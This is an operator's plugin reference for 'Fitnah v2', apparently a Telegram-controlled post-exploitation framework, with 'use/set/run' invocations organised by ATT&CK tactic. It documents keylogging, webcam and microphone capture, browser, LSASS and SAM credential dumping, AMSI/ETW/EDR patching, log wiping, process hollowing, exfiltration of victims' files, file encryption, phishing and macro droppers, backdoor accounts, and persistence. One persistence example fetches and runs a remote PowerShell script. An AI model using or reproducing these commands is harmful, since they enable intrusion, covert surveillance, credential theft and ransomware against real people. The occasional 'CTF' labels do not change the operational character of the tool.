# Plugin Reference — Fitnah v2

All 74 plugins, organised by MITRE ATT&CK tactic. Each entry shows the plugin name, MITRE technique, available parameters, and an example console invocation.

> **How to use any plugin:**
> ```
> use <plugin_name>     # load it
> options               # review parameters
> set <KEY> <value>     # configure
> run                   # execute against active agent
> ```

---

## Collection (7 plugins)

Gather data from the compromised host.

### `audio_capture` — T1123
Capture microphone audio for a specified duration.

| Param | Required | Default | Description |
|---|---|---|---|
| `duration_sec` | no | 10 | Recording duration |
| `out_file` | no | auto | Output path on agent |
| `list_devices` | no | false | List audio devices only |

```
use audio_capture
set duration_sec 30
run
```

### `clipboard_monitor` — T1115
Monitor clipboard content over time.

| Param | Required | Default | Description |
|---|---|---|---|
| `duration` | no | 60 | Monitor duration in seconds |
| `save_loot` | no | true | Save to loot database |

```
use clipboard_monitor
set duration 120
run
```

### `dir_list` — T1083
List directory contents recursively with optional ACL display.

| Param | Required | Default | Description |
|---|---|---|---|
| `path` | yes | — | Directory path |
| `recurse` | no | false | Recurse into subdirectories |
| `hidden` | no | false | Include hidden files |
| `filter` | no | * | File extension filter |
| `limit` | no | 500 | Maximum entries |

```
use dir_list
set path C:\Users
set recurse true
run
```

### `email_harvest` — T1114.001
Extract emails from Outlook or local mail files.

| Param | Required | Default | Description |
|---|---|---|---|
| `method` | no | outlook | `outlook` or `file` |
| `keyword` | no | | Filter keyword |
| `since_days` | no | 30 | Look back N days |
| `max_emails` | no | 100 | Maximum to retrieve |

```
use email_harvest
set keyword password
set since_days 7
run
```

### `file_search` — T1083
Search for files matching pattern or containing keywords.

| Param | Required | Default | Description |
|---|---|---|---|
| `pattern` | no | *.* | Filename glob pattern |
| `path` | no | C:\ | Search root |
| `depth` | no | 5 | Maximum recursion depth |
| `keyword` | no | | Content keyword |
| `interesting` | no | true | Auto-detect interesting files |

```
use file_search
set path C:\Users
set pattern *.kdbx
run
```

### `keylogger` — T1056.001
Record keystrokes on the target host.

| Param | Required | Default | Description |
|---|---|---|---|
| `action` | yes | start | `start` `stop` `dump` |
| `method` | no | winapi | `winapi` or `hook` |
| `interval` | no | 30 | Auto-dump interval (seconds) |

```
use keylogger
set action start
run
# later...
use keylogger
set action dump
run
```

### `webcam_snap` — T1125
Capture a frame from the webcam.

| Param | Required | Default | Description |
|---|---|---|---|
| `device_index` | no | 0 | Camera index |
| `frame_count` | no | 1 | Number of frames |

```
use webcam_snap
run
```

---

## Credential Access (6 plugins)

Extract credentials from the system.

### `browser_creds` — T1555.003
Extract saved passwords from Chrome, Firefox, Edge.

| Param | Required | Default | Description |
|---|---|---|---|
| `browser` | no | all | `chrome` `firefox` `edge` `all` |
| `decrypt` | no | true | Attempt DPAPI decryption |

```
use browser_creds
set browser all
run
```

### `clipboard` — T1115
Dump current clipboard content (text and images).

| Param | Required | Default | Description |
|---|---|---|---|
| `monitor_sec` | no | 0 | Monitor for N seconds (0 = snapshot) |
| `dump_image` | no | false | Also capture image clipboard |

```
use clipboard
run
```

### `dump_sam` — T1003.002
Dump the SAM database using multiple methods.

| Param | Required | Default | Description |
|---|---|---|---|
| `method` | no | reg | `reg` `shadow` `impacket` |
| `out_dir` | no | auto | Output directory |
| `evasion` | no | true | Enable evasion techniques |

```
use dump_sam
set method shadow
run
```

### `lsass_dump` — T1003.001
Dump LSASS memory for credential extraction.

| Param | Required | Default | Description |
|---|---|---|---|
| `method` | no | comsvcs | `comsvcs` `procdump` `direct` `task` |
| `out_path` | no | auto | Dump file path |
| `pid_override` | no | | Override LSASS PID |

```
use lsass_dump
set method direct
run
```

> **Note:** Requires SYSTEM or SeDebugPrivilege. Use `privilege_escalation` plugins first if needed.

### `vault_creds` — T1555.004
Extract Windows Credential Manager / Vault entries.

| Param | Required | Default | Description |
|---|---|---|---|
| `method` | no | api | `api` `powershell` |

```
use vault_creds
run
```

### `wifi_creds` — T1555
Dump saved Wi-Fi passwords via `netsh`.

| Param | Required | Default | Description |
|---|---|---|---|
| `export_xml` | no | false | Also export profile XML |

```
use wifi_creds
run
```

---

## Defense Evasion (14 plugins)

Bypass security controls and evade detection.

### `amsi_bypass` — T1562.001
Patch the Antimalware Scan Interface in the current process.

| Param | Required | Default | Description |
|---|---|---|---|
| `method` | no | patch | `patch` `reflection` `clr` `force_error` |
| `persistent` | no | false | Reinstall patch on detection |

```
use amsi_bypass
set method reflection
run
```

### `clear_logs` — T1070.001
Clear Windows event logs and forensic artefacts.

| Param | Required | Default | Description |
|---|---|---|---|
| `logs` | no | all | Specific log names or `all` |
| `all_channels` | no | false | Clear every event channel |
| `prefetch` | no | false | Also delete Prefetch files |

```
use clear_logs
set all_channels true
run
```

### `defender_exclude` — T1562.001
Add paths/processes to Windows Defender exclusions.

| Param | Required | Default | Description |
|---|---|---|---|
| `path` | no | | Path to exclude |
| `process` | no | | Process name to exclude |
| `disable_rt` | no | false | Disable real-time protection |

```
use defender_exclude
set path C:\Windows\Temp
run
```

### `etw_patch` — T1562.006
Patch `EtwEventWrite` to suppress ETW telemetry.

No parameters required — run directly:
```
use etw_patch
run
```

### `memory_patch` — T1562.001
Runtime memory patching for AMSI, ETW, UAC, and EDR hooks.

| Param | Required | Default | Description |
|---|---|---|---|
| `patch_type` | yes | amsi | `amsi` `etw` `uac` `edr` |
| `target_pid` | no | self | PID to patch (default: self) |
| `restore` | no | false | Restore original bytes |

```
use memory_patch
set patch_type edr
run
```

### `timing_evasion` — T1497
Sleep with jitter to evade sandbox timing analysis.

| Param | Required | Default | Description |
|---|---|---|---|
| `check_interval` | no | 10 | Check interval in seconds |
| `max_wait_time` | no | 300 | Maximum wait time |
| `mode` | no | smart | `smart` `fixed` `random` |

```
use timing_evasion
set mode smart
run
```

---

## Execution (11 plugins)

Execute code on the target system.

### `shell_exec` — T1059.003
Execute a command via `cmd /c`.

| Param | Required | Default | Description |
|---|---|---|---|
| `cmd` | yes | — | Command to run |
| `timeout` | no | 30 | Timeout in seconds |

```
use shell_exec
set cmd "net user /domain"
run
```

### `powershell` — T1059.001
Execute a PowerShell expression with optional AMSI bypass.

| Param | Required | Default | Description |
|---|---|---|---|
| `cmd` | yes | — | PS expression |
| `amsi_bypass` | no | true | Patch AMSI first |
| `timeout` | no | 30 | Timeout |

```
use powershell
set cmd "Get-LocalUser"
run
```

### `dll_inject` — T1055.001
Inject a DLL into a target process.

| Param | Required | Default | Description |
|---|---|---|---|
| `pid` | yes | — | Target process PID |
| `dll_path` | yes | — | Path to DLL on agent |
| `method` | no | loadlibrary | `loadlibrary` `manual` `hollowing` |

```
use dll_inject
set pid 1234
set dll_path C:\Windows\Temp\payload.dll
run
```

### `process_hollow` — T1055.012
Process hollowing — spawn a legitimate process and replace its image.

| Param | Required | Default | Description |
|---|---|---|---|
| `target_process` | no | svchost.exe | Sacrificial process path |
| `shellcode_b64` | yes | — | Base64 shellcode payload |

```
use process_hollow
set target_process C:\Windows\System32\notepad.exe
set shellcode_b64 <base64>
run
```

### `interactive_shell` — T1059.001
Spawn an interactive shell and pipe I/O through the C2.

| Param | Required | Default | Description |
|---|---|---|---|
| `shell` | no | cmd | `cmd` or `powershell` |
| `hide_window` | no | true | Hide the console window |

```
use interactive_shell
set shell powershell
run
```

---

## Exfiltration (4 plugins)

Move data out of the target environment.

### `upload_file` — T1041
Upload a file from the agent to the operator via Telegram.

| Param | Required | Default | Description |
|---|---|---|---|
| `path` | yes | — | File path on agent |
| `max_mb` | no | 50 | Maximum file size |

```
use upload_file
set path C:\Users\victim\Documents\secrets.xlsx
run
```

### `chunked_send` — T1041
Split a large file into chunks and send sequentially.

| Param | Required | Default | Description |
|---|---|---|---|
| `path` | yes | — | File path |
| `chunk_mb` | no | 10 | Chunk size in MB |
| `cleanup` | no | false | Delete file after send |

```
use chunked_send
set path C:\lsass.dmp
set chunk_mb 5
run
```

### `zip_exfil` — T1560.001
Zip a directory and exfiltrate it.

| Param | Required | Default | Description |
|---|---|---|---|
| `src` | yes | — | Source path |
| `dest` | no | auto | Zip output path |
| `filter` | no | * | File filter |

```
use zip_exfil
set src C:\Users\victim\Desktop
run
```

### `flag_submit` — T1041
Submit a CTF flag to a scoring server (CTF lab use).

| Param | Required | Default | Description |
|---|---|---|---|
| `url` | yes | — | Scoring server URL |
| `flag` | yes | — | Flag string |
| `method` | no | POST | HTTP method |

```
use flag_submit
set url http://ctf.lab/submit
set flag "FLAG{abc123}"
run
```

---

## Impact (3 plugins)

### `encrypt_files` — T1486
Encrypt files on the target (ransomware simulation for CTF).

| Param | Required | Default | Description |
|---|---|---|---|
| `path` | yes | — | Root directory |
| `ext` | no | * | File extension filter |
| `key_b64` | no | auto | AES key (base64) |

```
use encrypt_files
set path C:\Users\victim\Desktop
run
```

### `wipe_logs` — T1070
Wipe forensic artefacts.

| Param | Required | Default | Description |
|---|---|---|---|
| `event_logs` | no | true | Clear event logs |
| `prefetch` | no | false | Delete Prefetch |
| `amcache` | no | false | Clear Amcache |

```
use wipe_logs
set event_logs true
set prefetch true
run
```

---

## Initial Access (2 plugins — offline capable)

These plugins work without a live session (no agent required).

### `phish_link` — T1566.002
Generate a phishing URL for credential harvesting.

| Param | Required | Default | Description |
|---|---|---|---|
| `url` | yes | — | Target URL |
| `lure_text` | no | | Display text |
| `format` | no | html | `html` `markdown` `text` |

```
use phish_link
set url https://victim-corp.com/login
set lure_text "Your VPN password has expired"
run
```

### `macro_drop` — T1566.001
Generate a VBA macro document dropper.

| Param | Required | Default | Description |
|---|---|---|---|
| `url` | yes | — | Stager download URL |
| `command` | no | | Command to embed |
| `format` | no | doc | Output document format |

```
use macro_drop
set url http://your-server/stage.ps1
run
```

---

## Lateral Movement (12 plugins)

### `psexec` — T1021.002
Execute a command on a remote host via SMB.

| Param | Required | Default | Description |
|---|---|---|---|
| `target` | yes | — | Target IP or hostname |
| `cmd` | yes | — | Command to run |
| `username` | no | | Domain\User |
| `password` | no | | Password |

```
use psexec
set target 192.168.1.50
set cmd "whoami"
set username DOMAIN\administrator
set password P@ssw0rd
run
```

### `wmi_exec` — T1047
Execute via WMI (bypasses some host-based controls).

| Param | Required | Default | Description |
|---|---|---|---|
| `target` | yes | — | Target hostname/IP |
| `cmd` | yes | — | Command |
| `username` | no | | Credentials |

```
use wmi_exec
set target 192.168.1.50
set cmd "cmd /c net user hacker P@ss /add"
run
```

### `kerberoasting` — T1558.001
Request service tickets and extract for offline cracking.

| Param | Required | Default | Description |
|---|---|---|---|
| `domain` | yes | — | Target domain |
| `format` | no | hashcat | `hashcat` `john` |

```
use kerberoasting
set domain corp.local
run
# Output: hashes saved to loot, crack with hashcat -m 13100
```

### `rdp_enable` — T1021.001
Enable RDP and optionally add a backdoor user.

| Param | Required | Default | Description |
|---|---|---|---|
| `add_user` | no | | Username to add |
| `disable_nla` | no | true | Disable Network Level Authentication |

```
use rdp_enable
set add_user backdoor
run
```

---

## Persistence (5 plugins)

### `registry_run` — T1547.001
Add a Run key for persistence.

| Param | Required | Default | Description |
|---|---|---|---|
| `action` | no | add | `add` `remove` `list` |
| `name` | yes | — | Key name |
| `payload` | yes | — | Command to persist |
| `hive` | no | HKCU | `HKCU` or `HKLM` |

```
use registry_run
set name WindowsUpdate
set payload "C:\Windows\Temp\update.exe"
run
```

### `scheduled_task` — T1053.005
Create a scheduled task.

| Param | Required | Default | Description |
|---|---|---|---|
| `task_name` | yes | — | Task name |
| `payload` | yes | — | Command/executable |
| `trigger` | no | logon | `logon` `startup` `daily` |
| `run_as_system` | no | false | Run as SYSTEM |

```
use scheduled_task
set task_name MicrosoftEdgeUpdate
set payload "powershell -ep bypass C:\Temp\beacon.ps1"
set trigger logon
run
```

### `wmi_subscribe` — T1546.003
WMI event subscription for fileless persistence.

| Param | Required | Default | Description |
|---|---|---|---|
| `name` | yes | — | Subscription name |
| `payload` | yes | — | Command to run |
| `interval` | no | 60 | Trigger interval (seconds) |

```
use wmi_subscribe
set name SystemMaintenance
set payload "powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/b.ps1')"
run
```

---

## Recon (10 plugins)

### `sysinfo` — T1082
Collect full system information (works offline from session metadata).

```
use sysinfo
run
```

### `port_scan` — T1046
Scan TCP ports using nmap, masscan, or PowerShell fallback.

| Param | Required | Default | Description |
|---|---|---|---|
| `target` | yes | — | IP or hostname |
| `ports` | no | common | Port list or range (`22,80,443` or `1-1024`) |
| `method` | no | auto | `auto` `nmap` `masscan` `ps` |

```
use port_scan
set target 192.168.1.1
set ports 1-65535
set method nmap
run
```

### `arp_scan` — T1018
Discover hosts on the local subnet via ARP.

| Param | Required | Default | Description |
|---|---|---|---|
| `subnet` | yes | — | CIDR subnet (e.g. 192.168.1.0/24) |
| `smb_check` | no | false | Also check SMB signing |

```
use arp_scan
set subnet 192.168.1.0/24
run
```

### `domain_enum` — T1018, T1069, T1087
Enumerate Active Directory: users, groups, computers, trusts.

| Param | Required | Default | Description |
|---|---|---|---|
| `action` | no | all | `users` `groups` `computers` `trusts` `all` |
| `domain` | no | current | Domain to query |

```
use domain_enum
set action users
run
```
